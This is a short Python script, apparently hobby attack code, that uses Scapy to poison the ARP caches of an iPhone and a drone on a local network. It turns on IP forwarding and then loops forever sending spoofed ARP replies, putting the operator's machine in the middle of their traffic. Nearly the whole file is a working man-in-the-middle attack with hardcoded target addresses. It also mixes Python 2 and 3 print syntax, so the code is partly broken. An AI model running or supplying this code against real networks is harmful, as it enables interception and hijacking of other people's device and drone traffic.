from scapy.all import *
import os
 
# def enableIpForward():
#     fdesc = open("/proc/sys/net/ipv4/ip_forward", "r+")
#     for line in fdesc.readlines():
#         firstValue = line.strip()
#         if (firstValue != 1):
#             print "[+] IP Forward disabled... enabling.."
#             fdesc.write("1")
#     fdesc.close()
 
def spoofVictim(iphone_MAC, iphone_IP, droneIP_spoof, my_MAC):
	print( "Creating packet and sending to victim .." )
	srp1(Ether(dst=iphone_MAC)/ARP(pdst=iphone_IP, psrc=droneIP_spoof, hwsrc=my_MAC), timeout=2, verbose = 0)
 
def spoofRouter(drone_MAC, drone_IP, iphoneIP_spoof, my_MAC):
	print "Creating packet and sending to drone .." 
	srp1(Ether(dst=drone_MAC)/ARP(pdst=drone_IP, psrc=iphoneIP_spoof, hwsrc=my_MAC), timeout=2, verbose = 0)
 
 
count = 1
 
 
 

iphone_IP = "192.168.42.59"
iphone_MAC = "1C:36:BB:DF:E5:3B"

droneIP_spoof = "192.168.42.1"
iphoneIP_spoof = "192.168.42.59"

my_MAC = "00:0c:29:74:03:8b"

drone_IP = "192.168.42.1"
drone_MAC = "A0:14:3D:69:4F:04"

#ourMac = "88:25:2c:6f:47:73"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #enable port forwading
 
while True:
	spoofVictim(iphone_MAC, iphone_IP, droneIP_spoof, my_MAC)
	spoofRouter(drone_MAC, drone_IP, iphoneIP_spoof, my_MAC)
	count += 1
